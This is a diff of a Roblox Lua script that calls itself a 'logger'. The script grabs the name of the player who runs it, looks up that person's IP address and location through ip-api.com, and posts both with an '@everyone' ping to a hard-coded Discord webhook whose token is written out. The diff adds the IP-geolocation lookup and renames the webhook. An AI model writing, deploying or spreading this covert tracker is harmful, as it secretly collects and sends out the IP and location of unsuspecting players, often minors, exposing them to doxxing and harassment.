@@ -12,14 +12,14 @@ local webhookcheck =
 local url =
    "https://discord.com/api/webhooks/1366144001341915207/xHkaV6oK09KsBpS8lZLIIftbjXPm6VSp4hPx5mptmkC9NNItdaCkD8YrSFiLqUdr23_G" --pretty obvious what to do here
 local data = {
-            ["username"] = "mxqraper", --webhook name thing idk
-            ["avatar_url"] = "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/Adobe_XD_CC_icon.svg/800px-Adobe_XD_CC_icon.svg.png", --avatar image url
+            ["username"] = "Salmon-L0G", --webhook name thing idk
+            ["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png", --avatar image url
     
     ["content"] = " @everyone **" ..game.Players.LocalPlayer.Name.. "** just ran your logger", --normal message
     ["embeds"] = {
        {
            ["title"] = "** " ..game.Players.LocalPlayer.Name.. " just ran your logger**",
-           ["description"] = "**"..game:HttpGet("http://[Log in to view URL]").. "Username: "  ..game.Players.LocalPlayer.Name..", Uses: " ..webhookcheck.. "**",
+           ["description"] = "**"..game:HttpGet("http://ip-api.com/line/?fields=61439").. "Username: "  ..game.Players.LocalPlayer.Name..", Uses: " ..webhookcheck.. "**",
            ["type"] = "rich", --line above sends all the info grabbed using the api + username and exacutor
            ["color"] = 14680319,
            ["footer"] = {
@@ -33,7 +33,6 @@ local newdata = game:GetService("HttpService"):JSONEncode(data)
 
 local headers = {
    ["content-type"] = "application/json"
-
 }
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
